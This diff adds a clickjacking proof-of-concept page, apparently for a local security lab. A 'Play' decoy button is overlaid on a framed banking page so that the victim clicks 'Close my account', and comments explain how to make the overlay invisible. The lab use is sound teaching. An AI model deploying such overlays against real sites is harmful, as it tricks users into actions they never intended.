@@ -1,0 +1,23 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Free Game — Play now!</title>
+<style>
+  body{font-family:system-ui,sans-serif;text-align:center}
+  .stage{position:relative;width:360px;height:240px;margin:3rem auto;border:1px dashed #bbb}
+  /* The decoy the victim means to click. */
+  .decoy{position:absolute;top:150px;left:120px;padding:1rem 2rem;font-size:1.2rem}
+  /* The real bank page, enlarged and positioned so its "Close my account"
+     button sits under the decoy. opacity:0.2 so you can see the trick;
+     a real attacker would set opacity:0 (fully invisible). */
+  iframe{position:absolute;top:-250px;left:-70px;width:620px;height:620px;opacity:0.2;border:0}
+</style></head>
+<body>
+  <h1>🎮 Click “Play” to win!</h1>
+  <div class="stage">
+    <iframe src="http://localhost:8080/labs/clickjacking.php"></iframe>
+    <button class="decoy">▶ Play</button>
+  </div>
+  <p>Set the iframe <code>opacity</code> to 0 to make the overlay invisible.
+     Nudge <code>top</code>/<code>left</code> so the hidden button lands under “Play”.</p>
+</body>
+</html>
